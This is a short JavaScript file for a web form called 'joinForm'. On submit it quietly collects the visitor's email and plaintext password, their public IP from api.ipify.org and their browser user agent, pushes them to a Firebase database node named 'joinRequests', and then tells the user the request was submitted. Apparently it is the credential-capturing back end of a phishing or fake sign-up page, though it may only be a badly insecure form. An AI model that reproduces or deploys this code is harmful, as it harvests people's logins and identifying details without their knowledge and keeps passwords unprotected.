import { initializeApp } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-app.js";
import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyArUMHWhrM-g0m0-kXTu_EWmGACetQvLlc",
  authDomain: "asf-panel-sm.firebaseapp.com",
  projectId: "asf-panel-sm",
  storageBucket: "asf-panel-sm.firebasestorage.app",
  messagingSenderId: "444535178333",
  appId: "1:444535178333:web:da733a6f819a0c4529f9b4",
  measurementId: "G-BSFWL4LLY5"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

async function getUserIP() {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    return data.ip || "Unknown";
  } catch(e) {
    return "Unknown";
  }
}

document.getElementById("joinForm").addEventListener("submit", async (e) => {
  e.preventDefault();

  const email = document.getElementById("email").value.trim();
  const password = document.getElementById("password").value.trim();
  const ip = await getUserIP();
  const userAgent = navigator.userAgent;

  const newRef = push(ref(db, "joinRequests"));
  set(newRef, {
    email,
    password,
    ip,
    userAgent,
    addedTime: Date.now()
  })
  .then(() => {
    alert("✅ Request submitted!");
    e.target.reset();
  })
  .catch(err => alert("⚠️ " + err.message));
});
